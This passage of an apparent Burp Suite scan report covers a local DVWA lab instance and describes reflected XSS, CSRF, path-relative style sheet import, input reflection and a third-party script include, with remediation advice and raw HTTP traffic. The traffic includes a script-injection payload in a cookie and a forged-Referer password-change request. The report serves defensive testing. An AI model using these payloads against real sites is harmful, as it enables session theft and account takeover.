<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/captcha/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">c3vak'%3e%3cscript%3ealert(1)%3c%2fscript%3eliye5</span>; PHPSESSID=k2s41hlt0ug9i2eoonlgfbgh2b<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:20 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=k2s41hlt0ug9i2eoonlgfbgh2b; path=/<br>Set-Cookie: security=low<br>Content-Length: 4884<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Insecure CAPTCHA :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=captcha&amp;security=low<span class="HIGHLIGHT">c3vak'&gt;&lt;script&gt;alert(1)&lt;/script&gt;liye5</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="18.3">18.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200700_crosssiterequestforgery">Cross-site request forgery</a></span>
<br><a class="PREVNEXT" href="#18.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#18.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_tentative_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Tentative</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/captcha/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against authenticated users.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>
<ul>
<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>
<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>
<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>
<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/csrf">Web Security Academy: Cross-site request forgery</a></li>
    <li><a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-">Using Burp to Test for Cross-Site Request Forgery</a></li>
    <li><a href="https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf">The Deputies Are Still Confused</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/62.html">CAPEC-62: Cross Site Request Forgery</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/captcha/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=64mechuq719pava8bf7g592mcf<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://<span class="HIGHLIGHT">localhost</span>:7878/dvwa/vulnerabilities/captcha/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 65<br><br>step=1&amp;password_new=password&amp;password_conf=password&amp;Change=Change</span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:32 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4773<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;br /&gt;<br>&lt;b&gt;Warning&lt;/b&gt;:  Undefined array key "g-recaptcha-response" in &lt;b&gt;C:\xampp\htdocs\DVWA\vulnerabilities\captcha\source\low.php&lt;/b&gt; on line &lt;b&gt;14&lt;/b&gt;&lt;br /&gt;<br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/captcha/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; security=low; PHPSESSID=vqd28kaf25pkevvm54tj8rgf62<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://<span class="HIGHLIGHT">LskZa.com</span>:7878/dvwa/vulnerabilities/captcha/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 65<br><br>step=1&amp;password_new=password&amp;password_conf=password&amp;Change=Change</span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:37 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4773<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;br /&gt;<br>&lt;b&gt;Warning&lt;/b&gt;:  Undefined array key "g-recaptcha-response" in &lt;b&gt;C:\xampp\htdocs\DVWA\vulnerabilities\captcha\source\low.php&lt;/b&gt; on line &lt;b&gt;14&lt;/b&gt;&lt;br /&gt;<br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="18.4">18.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#18.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#18.5">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/captcha/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/captcha/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=k2s41hlt0ug9i2eoonlgfbgh2b<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:55 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4612<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Insecure CAPTCHA :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/captcha/<span class="HIGHLIGHT">index.php/ujtn36/yxtawq/lb68ym/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=k2s41hlt0ug9i2eoonlgfbgh2b<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:37 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4612<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Insecure CAPTCHA :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/captcha/index.php/ujtn36/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=k2s41hlt0ug9i2eoonlgfbgh2b<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:37 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4612<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Insecure CAPTCHA :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="18.5">18.5.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#18.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#18.6">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/captcha/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/captcha/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">z3cukngd5f</span>; PHPSESSID=k2s41hlt0ug9i2eoonlgfbgh2b<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:20 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=k2s41hlt0ug9i2eoonlgfbgh2b; path=/<br>Set-Cookie: security=low<br>Content-Length: 4830<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Insecure CAPTCHA :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=captcha&amp;security=low<span class="HIGHLIGHT">z3cukngd5f</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=captcha&amp;security=low<span class="HIGHLIGHT">z3cukngd5f</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="18.6">18.6.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00500500_crossdomainscriptinclude">Cross-domain script include</a></span>
<br><a class="PREVNEXT" href="#18.5">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/captcha/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The response dynamically includes the following script from another domain:<ul><li>https://www.google.com/recaptcha/api.js</li></ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>When an application includes a script from an external domain, this script is executed by the browser within the security context of the invoking application. The script can therefore do anything that the application's own scripts can do, such as accessing application data and performing actions within the context of the current user.</p>
<p>If you include a script from an external domain, then you are trusting that domain with the data and functionality of your application, and you are trusting the domain's own security to prevent an attacker from modifying the script to perform malicious actions within your application. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Scripts should ideally not be included from untrusted domains. Applications that rely on static third-party scripts should consider using Subresource Integrity to make browsers verify them, or copying the contents of these scripts onto their own domain and including them from there. If that is not possible (e.g. for licensing reasons) then consider reimplementing the script's functionality within application code.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
<li>
<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a>
</li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Inclusion of Functionality from Untrusted Control Sphere</a></li>
</ul></span>
<h2>Request 1</h2>
